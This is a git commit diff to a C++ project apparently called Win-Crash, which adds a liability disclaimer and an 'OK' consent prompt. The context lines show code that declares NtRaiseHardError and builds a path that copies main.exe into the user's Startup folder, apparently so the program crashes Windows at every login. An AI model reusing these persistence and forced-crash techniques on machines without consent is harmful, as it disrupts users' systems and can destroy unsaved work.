99da1c955b945faf947644242b02df102d53b2c4
Alphons <93847055+Crazypersonalph@users.noreply.github.com>
2022-09-12 20:57:44 +0800

    I don't want to be sued

--- src/main.cpp
+++ src/main.cpp
@@ -11,6 +11,18 @@ EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULO
 
 int main(void)
 {
+   std::string x;
+   std::cout << "This software is licensed under the MIT license" << std::endl;
+   std::cout << "The author of this software does not claim liability for any damages caused by the program, as per set out in the license." << std::endl;
+   std::cout << "For more information, go here: https://github.com/Crazypersonalph/Win-Crash/" << std::endl;
+   std::cout << "This is your chance to exit out of the program. Type in OK to continue. By typing in OK, you are agreeing that the author of this program claims no liability for any damage caused by said program, as set forth in the MIT license." << std::endl;
+   std::cin >> x;
+   if (x != "OK"){
+
+      abort();
+
+   }
+
      char * user = getenv("username");
      int counter = 15;
      std::string startup = "C:\\Users\\" + std::string(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe";
